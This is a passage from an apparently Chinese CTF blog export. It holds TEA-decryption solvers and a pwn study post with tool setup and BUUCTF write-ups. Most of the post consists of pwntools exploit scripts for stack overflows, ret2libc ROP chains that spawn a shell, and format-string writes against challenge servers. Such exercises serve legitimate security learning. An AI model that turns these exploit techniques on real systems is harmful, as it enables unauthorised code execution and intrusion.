key[<span class="number">4</span>]=&#123;<span class="number">0x000036B0</span>, <span class="number">0x00013816</span>, <span class="number">0x00000010</span>, <span class="number">0x0001E0F3</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> n=<span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">8</span>]=&#123;<span class="number">0x993CAB5C</span>, <span class="number">0x3F40E129</span>, <span class="number">0x777791DE</span>, <span class="number">0x737DFEA6</span>, <span class="number">0x0ECCF59E6</span>, <span class="number">0x0C9604CE3</span>, <span class="number">0x9682C0A5</span>, <span class="number">0x556F2A1E</span>&#125;;</span><br><span class="line">    decrypt(code,key,n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">0</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">1</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">2</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//9b34a61df773acf0e4dec25ea5fb0e29</span></span><br></pre></td></tr></table></figure><h2 id="app-debug"><a href="#app-debug" class="headerlink" title="app-debug"></a>app-debug</h2><p>先拖到jeb中看看，发现check函数在so文件里面，然后分析so文件发现了一个tracerpid 反调试，一篇比较好的文章<a href="https://www.jianshu.com/p/cae682a27f0c">https://www.jianshu.com/p/cae682a27f0c</a>，对付这种反调试是把TracerPid的值改为0就行了。这个反调试实际上就是将check函数里面的key给改了。<br><img src="https://i.loli.net/2021/07/12/ToNyfBDCnqLmQtd.png"></p><p>然后本来想ida结合adb调试看看的，发现so文件只给了arm的，雷电模拟器是x86架构的，就算了，反正这个加密也不难。安卓动调挺烦的，环境太苛刻了。</p><p>分析check函数，发现就是一个改了dealt的tea加密，key用反调试改了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *code , <span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> delta=<span class="number">0x458BCD42</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,sum=delta*<span class="number">32</span>,i;<span class="comment">// sum=0xC6EF3720</span></span><br><span class="line"></span><br><span class="line">    v0=code[<span class="number">0</span>];</span><br><span class="line">    v1=code[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1-=( (v0&lt;&lt;<span class="number">4</span>)+key[<span class="number">2</span>] ) ^ (v0+sum) ^ ( (v0&gt;&gt;<span class="number">5</span>)+key[<span class="number">3</span>] );</span><br><span class="line">        v0-=( (v1&lt;&lt;<span class="number">4</span>)+key[<span class="number">0</span>] ) ^ (v1+sum) ^ ( (v1&gt;&gt;<span class="number">5</span>)+key[<span class="number">1</span>] );</span><br><span class="line">        sum-=delta;</span><br><span class="line">    &#125;</span><br><span class="line">    code[<span class="number">0</span>]=v0;</span><br><span class="line">    code[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>]=&#123;<span class="number">9</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">2</span>]=&#123;<span class="number">0xF5A98FF3</span>,<span class="number">0xA21873A3</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i; </span><br><span class="line">    decrypt(code,key);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="keyword">char</span>*)(&amp;code[i])),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">1</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">2</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">3</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//GKcTFg0</span></span><br></pre></td></tr></table></figure><h2 id="KillerAid"><a href="#KillerAid" class="headerlink" title="KillerAid"></a>KillerAid</h2><p>这道题非常的恶心，把dll拖到ida里面用findcrypto插件发现了aes的表，加密函数在checkcode，整个逻辑用了aes里面的一些处理，但是不是aes，ida里面看起太恶心了，有时间在看看吧。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn学习</title>
      <link href="2021/07/11/pwn%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/07/11/pwn%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn学习"><a href="#pwn学习" class="headerlink" title="pwn学习"></a>pwn学习</h1><p>之前写的一个文章，相当于初步认识pwn吧。做做pwn题，当当pwn爷爷，哈哈哈，这个文章里面就记录一些pwn的环境搭建和一些命令，加上pwn做题记录吧。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>kali2020执行这些命令就行了。命令来源<br><a href="https://blog.csdn.net/Cony_14/article/details/109208558">https://blog.csdn.net/Cony_14/article/details/109208558</a></p><p>1.安装pwntools</p><pre><code>apt-get updateapt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essentialpython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntools//使用方法ROPgadget --binary ciscn_2019_c_1 --only &quot;pop|ret&quot;</code></pre><p>2.安装checksec</p><pre><code>git clone https://github.com/slimm609/checksec.sh.gitcd checksec.shsudo cp checksec /usr/bin/checksec//使用方法checksec --file=filename</code></pre><p>3.安装pwndbg</p><pre><code>git clone https://github.com/pwndbg/pwndbg cd pwndbgsudo ./setup.sh</code></pre><p>4.安装ROPGadget</p><pre><code>sudo pip install capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo python3 setup.py install</code></pre><p>5.安装LibcSearcher</p><pre><code>git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python3 setup.py develop</code></pre><p>6.安装32位libc,方便运行32位程序</p><pre><code>sudo dpkg --add-architecture i386sudo apt-get updatesudo apt-get install libc6:i386sudo apt-get install libgtk2.0-0:i386</code></pre><p>如果觉得kali里面的安装包下载的慢，也可以直接在windows上下载好了复制过去。</p><h2 id="pwndbg的使用"><a href="#pwndbg的使用" class="headerlink" title="pwndbg的使用"></a>pwndbg的使用</h2><p>常用命令<a href="https://www.cnblogs.com/zhwer/p/12494317.html">https://www.cnblogs.com/zhwer/p/12494317.html</a></p><p>到达设定的断点</p><pre><code>c</code></pre><p>步过</p><pre><code>n</code></pre><p>步入</p><pre><code>s</code></pre><p>查看栈空间</p><pre><code>stack 大小</code></pre><p>用gdb查看内存</p><pre><code>格式: x /nfu 地址说明x 是 examine 的缩写n表示要显示的内存单元的个数f表示显示方式, 可取如下值x 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十进制格式显示无符号整型。o 按八进制格式显示变量。t 按二进制格式显示变量。a 按十六进制格式显示变量。i 指令地址格式c 按字符格式显示变量。f 按浮点数格式显示变量。u表示一个地址单元的长度b表示单字节，h表示双字节，w表示四字节，g表示八字节</code></pre><h2 id="遇到的报错，坑"><a href="#遇到的报错，坑" class="headerlink" title="遇到的报错，坑"></a>遇到的报错，坑</h2><h3 id="ROPGadget报错"><a href="#ROPGadget报错" class="headerlink" title="ROPGadget报错"></a>ROPGadget报错</h3><p><a href="https://blog.csdn.net/yongbaoii/article/details/109098446">https://blog.csdn.net/yongbaoii/article/details/109098446</a></p><h2 id="buucrf刷题记录"><a href="#buucrf刷题记录" class="headerlink" title="buucrf刷题记录"></a>buucrf刷题记录</h2><h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h3><p>就连接到端口就给flag<br><img src="https://i.loli.net/2021/05/05/LUsIuy13XQlYDmr.png"></p><pre><code>nc 域名 端口号</code></pre><p><img src="https://i.loli.net/2021/05/05/KqcZX8LhmJBHNR1.png"></p><h3 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h3><p>考点，栈溢出<br><img src="https://i.loli.net/2021/05/05/2S1EgIwR45jiJor.png"><br>然后初略画一个栈图</p><p><img src="https://i.loli.net/2021/05/05/xTZlwseWiPNzuAB.png"></p><p>exp</p><pre><code>from pwn import *p = remote(&quot;node3.buuoj.cn&quot;,&quot;25728&quot;)//连接到题目端口，连接到本地用processpayload = b&#39;a&#39; * (15+8) + p64(0x401186+1)p.sendline(payload)p.interactive()//打开交互界面。</code></pre><p>得到flag<br><img src="https://i.postimg.cc/Bb3gzDMR/Snipaste-2021-05-05-20-03-19.png"></p><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>考点，栈溢出<br><img src="https://i.postimg.cc/Sx4nzdjB/Snipaste-2021-05-05-20-14-58.png"><br>exp</p><pre><code>from pwn import *p = remote(&quot;node3.buuoj.cn&quot;,&quot;25681&quot;)payload = b&#39;a&#39; * (0x40+8) + p64(0x40060D)p.sendline(payload)p.interactive() </code></pre><p>getflag<br><img src="https://i.postimg.cc/7hXWMmwK/Snipaste-2021-05-05-20-18-00.png"></p><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>考点，修改某一变量的数据，还有float型变量在内存中的形式，实际上这个直接可以在ida里面看到，是41348000h<br><img src="https://i.postimg.cc/5y325dXD/Snipaste-2021-05-05-20-25-24.png"></p><p>exp</p><pre><code>from pwn import *p = remote(&quot;node3.buuoj.cn&quot;,&quot;25437&quot;)payload = b&#39;a&#39; * (0x30-4) + p64(0x41348000)p.sendline(payload)p.interactive() </code></pre><p>getflag<br><img src="https://i.postimg.cc/GmJ9dD3b/Snipaste-2021-05-05-20-50-32.png"></p><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>一个strcpy的溢出，虽然get规定了字节数，但是replace可以替代I为you，一个字节变3个字节，从而溢出</p><p><img src="https://i.postimg.cc/sXSnpqWP/Snipaste-2021-05-06-21-10-06.png"><br>exp</p><pre><code>#! /usr/bin/python3from pwn import *#io = process(&#39;pwn1_sctf_2016&#39;)io=remote(&quot;node3.buuoj.cn&quot;,&#39;27656&#39;)#gdb.attach(io,&#39;b *0x080492BF&#39;)payload = b&#39;I&#39;*20+b&#39;A&#39;*4+ p32(0x08048F0D)io.sendline(payload)io.interactive()</code></pre><p>getflag<br><img src="https://i.postimg.cc/mDbcwFzd/Snipaste-2021-05-06-21-12-20.png"></p><h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><p>read函数溢出<br><img src="https://i.postimg.cc/G2kTRwV5/Snipaste-2021-05-06-22-07-45.png"><br>exp</p><pre><code>#! /usr/bin/python3from pwn import *#io = process(&#39;pwn1_sctf_2016&#39;)io=remote(&quot;node3.buuoj.cn&quot;,&#39;25647&#39;)payload = b&#39;a&#39;*0x80 +b&#39;a&#39;*8 + p64(0x0400596)io.sendline(payload)io.interactive()</code></pre><p>flag</p><pre><code>flag&#123;0fba0969-32cb-4d74-8509-803551ddb087&#125;</code></pre><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p>这道题就是在告诉你没有后门函数的时候，怎么调用libc中的system。</p><p>还是先来看漏洞点<br><img src="https://i.postimg.cc/MKZN5SRH/Snipaste-2021-05-07-14-28-16.png"><br>然后我们需要得到libc的版本，要用到这两个库</p><p>ROPgadget，用来构建rop链的。</p><pre><code>ROPgadget --binary ciscn_2019_c_1 --only &quot;pop|ret&quot;</code></pre><p>可以得到<br><img src="https://i.loli.net/2021/05/07/9LMBNlROP4xyIS2.png"><br>另一个就是，LibcSearcher，可以自动得到libc的版本信息，但是有时候会失效，所以可以去这个网站找<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>，只需要输入你的函数，got表函数地址后3位(16进制下的函数地址)。</p><p>下面我们动调来看看exp的大概含义</p><p>exp</p><pre><code>from pwn import *from LibcSearcher import *#这个应该是看调试信息的，没有也问题不大#context.os=&#39;linux&#39;#context.arch=&#39;amd64&#39;#context.log_level=&#39;debug&#39;#将常用的函数定义一下ru=lambda x:io.recvuntil(x)rl=lambda :io.recvline()sla=lambda x,y:io.sendlineafter(x,y)#io=remote(&#39;node3.buuoj.cn&#39;,29235)io = process(&#39;./ciscn_2019_c_1&#39;)elf=ELF(&#39;./ciscn_2019_c_1&#39;)gdb.attach(io,&#39;b *0x000400AEE&#39;)ret=0x4006b9pop_rdi=0x400c83main=elf.sym[&#39;main&#39;]puts_plt=elf.plt[&#39;puts&#39;]puts_got=elf.got[&#39;puts&#39;]sla(&#39;choice!\n&#39;,&#39;1&#39;)payload=b&#39;\0&#39;+b&#39;a&#39;*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)  //构建的一个链，用puts函数打印出，got表中puts函数的地址，并且回到main函数sla(&#39;encrypted\n&#39;,payload)rl()rl()puts=u64(ru(b&#39;\n&#39;)[:-1].ljust(8,b&#39;\0&#39;))//打包，得到got表的puts函数地址print(puts)#libc=LibcSearcher(&#39;puts&#39;,puts)   //通过puts函数地址来获取libc版本，本地的libc这个函数搜不到，远程端口的libc可以搜到#下面的函数偏移地址都是通过网站得到的。libc_addr=puts-0x0765f0binsh=libc_addr+0x18a156system=libc_addr+0x048e50sla(&#39;choice!\n&#39;,&#39;1&#39;)payload=b&#39;\0&#39;+b&#39;a&#39;*(0x50-1+8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)//调用system函数，getshellsla(&#39;encrypted\n&#39;,payload)io.interactive()</code></pre><p>下面看看gdb里面构造的两个playload长什么样</p><p>构造的第一个栈结构，最好是自己画一下，然后想一想每一步怎么走。<br><img src="https://i.loli.net/2021/05/07/1YmnwyvKq5hl7sr.png"><br>第二个<br><img src="https://i.loli.net/2021/05/07/VRJO2c5AG9P6Dhp.png"><br>然后端口题也差不多，而且还可以用LibcSearcher(‘puts’,puts)直接获得libc版本，然后用下面的方式来得到想要的地址</p><pre><code>libc=LibcSearcher(&#39;puts&#39;,puts)libc_addr=puts-libc.dump(&#39;puts&#39;)binsh=libc_addr+libc.dump(&#39;str_bin_sh&#39;)system=libc_addr+libc.dump(&#39;system&#39;)</code></pre><h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h3><p>考点，格式化字符串漏洞，详讲<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p><p>分析<br><img src="https://i.loli.net/2021/05/07/KTPNkOHaWAQXUc1.png"><br>首先我们需要知道这个buf在在栈中的位置，和偏移量<br><img src="https://i.loli.net/2021/05/07/fGWzxHhNR89Lo5a.png"><br>然后就可以变量dword_804C044的值了，通过%n来修改这个变量的值了</p><pre><code>p32(0x804C044)+b&#39;%10$n&#39;//这里我的理解是，%10$就是0x804C044这个地址作为了参数，然后前面就是&#39;\x44\xc0\x4c\x80&#39;4个字符，通过%n将4这个值给了0x804C044这个地址</code></pre><p>exp1</p><pre><code>#! /usr/bin/python3from pwn import *io = process(&#39;./pwn&#39;)#io=remote(&quot;node3.buuoj.cn&quot;,&#39;28200&#39;)#gdb.attach(io,&#39;b *0x080492B2&#39;)playload=p32(0x804C044)+b&#39;%10$n&#39;io.sendline(playload)io.recvuntil(&quot;passwd:&quot;)io.sendline(b&#39;4&#39;)io.interactive()</code></pre><p>还看到一个有趣的exp2，它是一个一个字节给的值。</p><pre><code>from pwn import *io=process(&#39;./pwn&#39;)#io=remote(&#39;node3.buuoj.cn&#39;,28200)addr=0x0804C044payload+=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3) + b&#39;%10$hhn%11$hhn%12$hhn%13$hhn&#39;io.sendline(payload)payload=str(0x10101010)io.sendline(payload)io.interactive()</code></pre><p>getflag<br><img src="https://i.loli.net/2021/05/08/tDCjTkJ7H1Op5ue.png"></p><h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><p>简单的strncmp绕过，然后溢出函数返回地址，构建rop链来获得libc库里面的system函数，然后再次溢出函数返回地址调用system函数。</p><p>先看ida<br><img src="https://i.loli.net/2021/05/08/7CQEyIKxzowcdvp.png"><br>漏洞函数<br><img src="https://i.loli.net/2021/05/08/MevGxJq6bLSjzNn.png"></p><p>大概思路就和ciscn_2019_c_1差不多了，只不过这个是32位的，构造rop链的时候不一样</p><p>exp</p><pre><code>from pwn import *from LibcSearcher import *#context.os=&#39;linux&#39;#context.arch=&#39;amd64&#39;#context.log_level=&#39;debug&#39;ru=lambda x:io.recvuntil(x)rl=lambda :io.recvline()sla=lambda x,y:io.sendlineafter(x,y)io=remote(&#39;node3.buuoj.cn&#39;,25852)#io = process(&#39;./pwn&#39;)elf=ELF(&#39;./pwn&#39;)main=0x08048825write_plt=elf.plt[&#39;write&#39;]write_got=elf.got[&#39;write&#39;]#绕过strncmpplayload=b&#39;\x00&#39;+b&#39;\xff&#39;*10io.sendline(playload)#构造rop链，打印write地址，然后返回主函数，p32(0x1) + p32(write_got) + p32(0x4)这3个是write的参数。io.recvuntil(&quot;Correct\n&quot;)playload=b&#39;a&#39;*(0xe7+4) + p32(write_plt) + p32(main) + p32(0x1) + p32(write_got) + p32(0x4)io.sendline(playload)write=u32(io.recv(4))print(hex(write))libc=LibcSearcher(&#39;write&#39;,write)libc_addr=write-libc.dump(&#39;write&#39;)system=libc_addr+libc.dump(&#39;system&#39;)binsh=libc_addr+libc.dump(&#39;str_bin_sh&#39;)#这个是我在本地的。#libc_addr=write-0x0f2010#system=libc_addr+0x045040#binsh=libc_addr+0x18c33cplayload=b&#39;\x00&#39;+b&#39;\xff&#39;*10io.sendline(playload)#p32(0x0)，这个起一个填充作用io.recvuntil(&quot;Correct\n&quot;)playload=b&#39;a&#39;*(0xe7+4) + p32(system) + p32(0x0) + p32(binsh)io.sendline(playload)io.interactive()</code></pre><p>调试一下，调试的本地的。</p><p>第一个rop链<br><img src="https://i.loli.net/2021/05/08/tQVd6Juhsa27SZf.png"><br>第二个<br><img src="https://i.loli.net/2021/05/08/oSIqzPYK3JpejUm.png"><br>getflag<br><img src="https://i.loli.net/2021/05/08/JVwXa5tizW6hY1g.png"></p><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>get函数溢出，然后进入get_flag函数，根据构建的参数绕过if判断。</p><p>先分析<br><img src="https://i.loli.net/2021/05/08/rdaKH6itIecvohz.png"><br>打本地时先建一个flag文件夹，然后就有个坑，我以为get_flag函数后面可以随便跟一个地址，结果一直不对，看了wp后，发现这个地址必须是exit地址，不然回显。</p><p>exp</p><pre><code>from pwn import *context.log_level = &#39;debug&#39;#io = process(&#39;./pwn&#39;)io=remote(&quot;node3.buuoj.cn&quot;,&#39;28627&#39;)#gdb.attach(io,&#39;b *0x08048A40&#39;)exit_addr=0x0804E6A0playload=b&#39;a&#39;*0x38 + p32(0x080489A0) + p32(exit_addr) + p32(0x308CD64F) + p32(0x195719D1)io.sendline(playload)io.interactive()</code></pre><p>getflag<br><img src="https://i.loli.net/2021/05/08/iy9aXjbpGtzFudT.png"><br>然后其他师傅，还有一种方法，暂时没看懂。</p><h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><p>输入数据，确保var[13]==0x11就行，注意var是一个DWORD型的数组</p><p>exp</p><pre><code>from pwn import *#context.log_level = &#39;debug&#39;#io = process(&#39;./pwn&#39;)io=remote(&quot;node3.buuoj.cn&quot;,&#39;28623&#39;)playload=p32(0x61)*13+p32(0x11)io.sendline(playload)io.interactive()</code></pre><p>getflag</p><pre><code>flag&#123;2979ebe4-ad0f-474a-a64c-340b7c2674ad&#125;</code></pre><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><p>和前面一道题是一样的</p><p>exp</p><pre><code>from pwn import *from LibcSearcher import *ru=lambda x:io.recvuntil(x)rl=lambda :io.recvline()sla=lambda x,y:io.sendlineafter(x,y)io=remote(&#39;node3.buuoj.cn&#39;,29438)#io = process(&#39;./ciscn_2019_en_2&#39;)elf=ELF(&#39;./ciscn_2019_en_2&#39;)#gdb.attach(io,&#39;b *0x000400AEE&#39;)ret=0x4006b9pop_rdi=0x400c83main=elf.sym[&#39;main&#39;]puts_plt=elf.plt[&#39;puts&#39;]puts_got=elf.got[&#39;puts&#39;]sla(&#39;choice!\n&#39;,&#39;1&#39;)payload=b&#39;\0&#39;+b&#39;a&#39;*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main) sla(&#39;encrypted\n&#39;,payload)rl()rl()puts=u64(ru(b&#39;\n&#39;)[:-1].ljust(8,b&#39;\0&#39;))libc=LibcSearcher(&#39;puts&#39;,puts) libc_addr=puts-libc.dump(&#39;puts&#39;)binsh=libc_addr+libc.dump(&#39;str_bin_sh&#39;)system=libc_addr+libc.dump(&#39;system&#39;)sla(&#39;choice!\n&#39;,&#39;1&#39;)payload=b&#39;\0&#39;+b&#39;a&#39;*(0x50-1+8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)sla(&#39;encrypted\n&#39;,payload)io.interactive()</code></pre><p>getflag</p><pre><code>flag&#123;34ec96ce-e880-47de-ae14-49f7e3d34c5a&#125;</code></pre><h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><p>这道题就是调用system函数，参数’/bin/sh’在date区。<br><img src="https://i.loli.net/2021/05/08/4cG3fqTM7JltxOD.png"><br>所以说我的exp中p32(0x0804849E)后面直接跟的参数</p><p>exp</p><pre><code>from pwn import *#context.log_level = &#39;debug&#39;#io = process(&#39;./level2&#39;)io=remote(&quot;node3.buuoj.cn&quot;,&#39;29517&#39;)#gdb.attach(io,&#39;b *0x0804847F&#39;)playload=b&#39;a&#39;*(0x88+4) + p32(0x0804849E) + p32(0x0804A024)io.sendline(playload)io.interactive()</code></pre><p>网上的exp，可以看到如果直接调用system函数地址，中间是需要4个字节来填充一下，说明ret时，esp+4了。</p><pre><code>from pwn import*elf=ELF(&quot;level2&quot;)#a=remote(&quot;pwn2.jarvisoj.com&quot;,&quot;9878&quot;)a.recvuntil(&quot;Input:\n&quot;)#system_addr=elf.symbols[&quot;system&quot;]#shell_addr=next(elf.search(&quot;/bin/sh&quot;))payload=&#39;A&#39;*140+p32(0x08048320)+p32(0x1)+p32(0x0804A024)a.send(payload)a.interactive()</code></pre><p>getflag</p><pre><code>flag&#123;cb5545be-ed40-4a68-ac03-4528dca09de5&#125;</code></pre><h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>自己调用write函数，打印flag<br><img src="https://i.loli.net/2021/05/09/slcZK9JBAbtyCOE.png"></p><p>rop链大概思路，溢出ret返回到get_secret，调用get_secret函数中的ret返回到write函数，后面的0是填充作用，然后后面p32(1) +p32(0x080ECA2D) +p32(0x2D)是参数。</p><pre><code>playload=b&#39;a&#39;*0x2D + p32(0x080489A0) + p32(write) +p32(0x0)+ p32(1) +p32(0x080ECA2D) +p32(0x2D)</code></pre><p>exp</p><pre><code>from pwn import *#context.log_level = &#39;debug&#39;#io = process(&#39;./pwn&#39;)io=remote(&quot;node3.buuoj.cn&quot;,&#39;27066&#39;)#gdb.attach(io,&#39;b *0x08048A00&#39;)elf=ELF(&#39;./pwn&#39;)main=0x080489E0write=elf.sym[&#39;write&#39;]playload=b&#39;a&#39;*0x2D + p32(0x080489A0) + p32(write) +p32(0x0)+ p32(1) +p32(0x080ECA2D) +p32(0x2D)io.sendline(playload)io.interactive()</code></pre><p>getflag</p><pre><code>flag&#123;8801ef04-6fca-4c81-8063-c5e03ef5c50d&#125;</code></pre><h3 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h3><p>64位的栈溢出，调用system函数，注意传参用rdi就行</p><p>先ida看看结构<br><img src="https://i.loli.net/2021/05/09/C2co5kqA8bgYRt4.png"></p><p>先用</p><pre><code>ROPgadget --binary pwn --only &quot;pop|ret&quot;</code></pre><p><img src="https://i.loli.net/2021/05/09/3FHlv2XkJGYcOdK.png"></p><p>exp</p><pre><code>from pwn import*elf=ELF(&quot;./pwn&quot;)io=remote(&quot;node3.buuoj.cn&quot;,&quot;25471&quot;)#io = process(&#39;./pwn&#39;)#gdb.attach(io,&#39;b*0x004007CB&#39;)system_addr=elf.symbols[&quot;system&quot;]shell_addr=0x400858ret_rdi=0x0400833io.recvuntil(&quot;of your name:\n&quot;)payload=&#39;55&#39;io.sendline(payload)io.recvuntil(&quot;What&#39;s u name?\n&quot;)payload=b&#39;a&#39;*(0x10+8) + p64(ret_rdi)+p64(shell_addr)+p64(system_addr)io.sendline(payload)io.interactive()</code></pre><p>getflag</p><pre><code>flag&#123;35e5b20c-79cf-4654-8cb1-d7c2f615a364&#125;</code></pre><h3 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h3><p>这个题和上一题差不多，只是flag在./home/babyrop里面</p><p>exp</p><pre><code>from pwn import*elf=ELF(&quot;./pwn&quot;)io=remote(&quot;node3.buuoj.cn&quot;,&quot;26407&quot;)#io = process(&#39;./pwn&#39;)#gdb.attach(io,&#39;b*0x004007CB&#39;)system_addr=elf.symbols[&quot;system&quot;]shell_addr=0x0601048ret_rdi=0x0400683payload=b&#39;a&#39;*(0x10+8) + p64(ret_rdi)+p64(shell_addr)+p64(system_addr)io.sendline(payload)io.interactive()</code></pre><p>getflag</p><pre><code>flag&#123;794d1e80-d3bf-4fa9-803c-f8b8212e2f8b&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工程实践作业报告</title>
      <link href="2021/07/11/%E5%A4%A7%E4%B8%80%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5%E4%BD%9C%E4%B8%9A/"/>
      <url>2021/07/11/%E5%A4%A7%E4%B8%80%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5%E4%BD%9C%E4%B8%9A/</url>
      
